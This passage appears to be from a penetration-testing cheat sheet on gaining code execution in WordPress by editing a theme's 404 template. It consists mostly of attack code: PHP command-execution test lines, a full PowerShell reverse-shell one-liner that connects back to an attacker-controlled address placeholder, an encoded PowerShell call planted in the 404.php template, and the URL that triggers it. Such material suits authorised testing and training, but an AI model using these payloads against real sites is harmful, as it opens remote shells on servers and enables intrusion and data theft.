> Check what the underlying OS is using a test command in the plugin editor:

**Linux**: 

```
<?php echo shell_exec('uname -a'); ?>
```

**Windows**:

```
<?php echo shell_exec('ver'); ?>
```

> We can also use this template as seen below:

```
<?php
/**
 * The template for displaying 404 pages (Not Found)
 */

// RCE Test
system("whoami");

// Rest of the 404 template code...
get_header(); ?>
...
```

> Once we have confirmed our OS we can edit the template with a reverse shell script and then navigate to it to trigger the shellcode:

**Linux:**

`We can use the pentest monkey script to get a php reverse shell.`

**Windows:**

`We can encode a powershell reverse shell code and then run it:`

> Encode using UTF16LE:

```
$client = New-Object System.Net.Sockets.TCPClient("<kali_ip>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

> Then we can add it in our script:

```
<?php
/**
 * The template for displaying 404 pages (Not Found)
 */

// RCE Test
system("powershell -exec bypass -enc ...");

// Rest of the 404 template code...
get_header(); ?>
...
```

> To trigger it we can navigate to the URL:

```
http://<ip>/wp-content/themes/<theme_name>/404.php
```
